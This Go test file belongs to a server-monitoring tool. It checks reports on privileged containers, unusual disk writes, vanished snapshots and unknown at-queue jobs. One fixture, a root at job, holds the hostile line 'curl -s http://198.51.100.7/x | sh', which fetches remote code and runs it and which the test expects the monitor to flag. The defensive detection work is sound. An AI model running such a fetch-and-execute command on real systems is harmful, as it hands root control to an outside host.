package host

import (
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/junkerderprovinz/parleyport/kit/status"
)

const gib = 1 << 30

func container(t *testing.T, root, id, name, hostConfig string) {
	t.Helper()
	dir := "/var/lib/docker/containers/" + id
	write(t, root, dir+"/config.v2.json", `{"Name":"/`+name+`","State":{"Running":true},"LogPath":"`+dir+"/"+id+`-json.log"}`)
	write(t, root, dir+"/hostconfig.json", hostConfig)
}

func TestAContainerWithSpecialRightsIsReportedOncePerRight(t *testing.T) {
	s := newServer(t)
	container(t, s.root, "aa"+strings64, "Portainer", `{"Privileged":false,"NetworkMode":"bridge","Binds":["/var/run/docker.sock:/var/run/docker.sock"]}`)
	h := s.host(t)
	s.look(h)
	noNeed(t, h, Unraid, "Portainer")

	container(t, s.root, "bb"+strings64, "Netdata", `{"Privileged":true,"NetworkMode":"host","Binds":["/proc:/host/proc:ro"]}`)
	container(t, s.root, "cc"+strings64, "Plex", `{"Privileged":false,"NetworkMode":"bridge","Binds":["/mnt/user/media:/media"]}`)
	s.look(h)
	var got []string
	for _, n := range row(h.Rows("en"), Unraid).Needs {
		got = append(got, n.Text)
	}
	joined := strings.Join(got, "\n")
	if len(got) != 2 || !strings.Contains(joined, "Netdata has a special right: full access to the server (privileged)") ||
		!strings.Contains(joined, "Netdata has a special right: the server's own network (host network)") {
		t.Fatalf("%s", joined)
	}
	s.look(h)
	if n := len(row(h.Rows("en"), Unraid).Needs); n != 2 {
		t.Errorf("told again: %d", n)
	}
}

func TestReadingOrWritingFarMoreThanUsualIsReported(t *testing.T) {
	w := newWatch(baseline{})
	at := now
	var read, written uint64
	step := func(r, wr uint64, busy bool) []finding {
		read, written = read+r, written+wr
		at = at.Add(slowEvery)
		return w.io(at, map[string]uint64{"disk1|read": read, "disk1|write": written}, busy)
	}
	for i := range ioLearn + ioRing {
		if got := step(gib/12, 100<<20, false); len(got) != 0 {
			t.Fatalf("while learning, step %d: %v", i, keys(got))
		}
	}
	if got := step(gib/12, 100<<20, false); len(got) != 0 {
		t.Fatalf("a usual hour: %v", keys(got))
	}
	for range ioRing - 1 {
		step(gib/12, 3*gib/4, true)
	}
	if got := step(gib/12, 3*gib/4, true); len(got) != 0 {
		t.Fatalf("while a parity check or the mover runs: %v", keys(got))
	}
	var got []finding
	for range ioRing {
		got = append(got, step(gib/12, 3*gib/4, false)...)
	}
	if len(got) != 1 || got[0].Key != "h_w_io_write" || got[0].Args["disk"] != "Disk 1" || got[0].Level != status.SeverityWarn {
		t.Fatalf("%+v", got)
	}
	if more := step(gib/12, 3*gib/4, false); len(more) != 0 {
		t.Errorf("told again within hours: %v", keys(more))
	}
}

func TestAFreshServerLearnsItsDisksBeforeItJudgesThem(t *testing.T) {
	w := newWatch(baseline{})
	at := now
	var written uint64
	for range ioRing + 2 {
		written += 50 * gib
		at = at.Add(slowEvery)
		if got := w.io(at, map[string]uint64{"cache|write": written}, false); len(got) != 0 {
			t.Fatalf("%v", keys(got))
		}
	}
}

func TestSnapshotsThatVanishWithoutAnAppOfTheFortressAreReported(t *testing.T) {
	s := newServer(t)
	write(t, s.root, "/var/local/emhttp/disks.ini", disksIni+`["fast"]
name="fast"
device="nvme1n1"
rotational="0"
fsType="zfs"
["store"]
name="store"
device="sdg"
rotational="1"
spundown="1"
fsType="btrfs"
`)
	snaps := []string{"fast/appdata@daily-1", "fast/appdata@daily-2", "fast/appdata@daily-3", "fast/vms@weekly-1"}
	var asked []map[string]string
	h := s.host(t)
	h.o.Snaps = func(pools map[string]string) map[string][]string {
		asked = append(asked, pools)
		return map[string][]string{"fast": snaps}
	}
	h.o.Claimed = func(name string) bool { return strings.HasPrefix(name, "daily-") }
	s.look(h)
	if len(asked) != 1 || fmt.Sprint(asked[0]) != "map[fast:zfs]" {
		t.Fatalf("pools asked: %v", asked)
	}
	snaps = []string{"fast/appdata@daily-3"}
	s.look(h)
	got := needs(h.Rows("en"), Unraid)
	if len(got) != 1 || got[0] != "Snapshots of fast/vms are gone: 1. No app of your fortress logged removing them, so something else probably did." {
		t.Fatalf("%q", got)
	}
	s.look(h)
	if again := needs(h.Rows("en"), Unraid); len(again) != 1 {
		t.Errorf("%q", again)
	}
}

func TestSnapshotsOfThePoolAppDeletedAreNoFinding(t *testing.T) {
	s := newServer(t)
	write(t, s.root, "/var/local/emhttp/disks.ini", disksIni+`["fast"]
name="fast"
device="nvme1n1"
rotational="0"
fsType="btrfs"
`)
	snaps := []string{"fast/.snapshots/a", "fast/.snapshots/b"}
	h := s.host(t)
	h.o.Snaps = func(map[string]string) map[string][]string { return map[string][]string{"fast": snaps} }
	h.o.Claimed = func(string) bool { return true }
	s.look(h)
	snaps = nil
	s.look(h)
	if got := needs(h.Rows("en"), Unraid); len(got) != 0 {
		t.Errorf("%q", got)
	}
}

const atJob = `#!/bin/sh
# atrun uid=0 gid=0
# mail root 0
umask 22
PATH=/usr/local/sbin:/usr/sbin:/sbin; export PATH
HOME=/root; export HOME
cd /root || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
${SHELL:-/bin/sh} << 'marcinDELIMITER5c1a2b3d'
curl -s http://198.51.100.7/x | sh
marcinDELIMITER5c1a2b3d
`

func TestAnUnknownJobInTheAtQueueIsReportedOnce(t *testing.T) {
	s := newServer(t)
	write(t, s.root, "/var/spool/atjobs/a0000101b2c3d4", strings.ReplaceAll(atJob, "curl -s http://198.51.100.7/x | sh", "/usr/local/sbin/mover"))
	write(t, s.root, "/var/spool/atjobs/.SEQ", "2\n")
	if got := fmt.Sprint(readAt(s.root)); got != "[/usr/local/sbin/mover]" {
		t.Fatalf("%s", got)
	}
	h := s.host(t)
	s.look(h)
	write(t, s.root, "/var/spool/atjobs/a0000201b2c3e0", atJob)
	s.look(h)
	got := needs(h.Rows("en"), Unraid)
	if len(got) != 1 || got[0] != "A job TollRoll has not seen before waits in the at queue: curl -s http://198.51.100.7/x | sh" {
		t.Fatalf("%q", got)
	}
	s.at = s.at.Add(time.Minute)
	s.look(h)
	if again := needs(h.Rows("en"), Unraid); len(again) != 1 {
		t.Errorf("%q", again)
	}
}
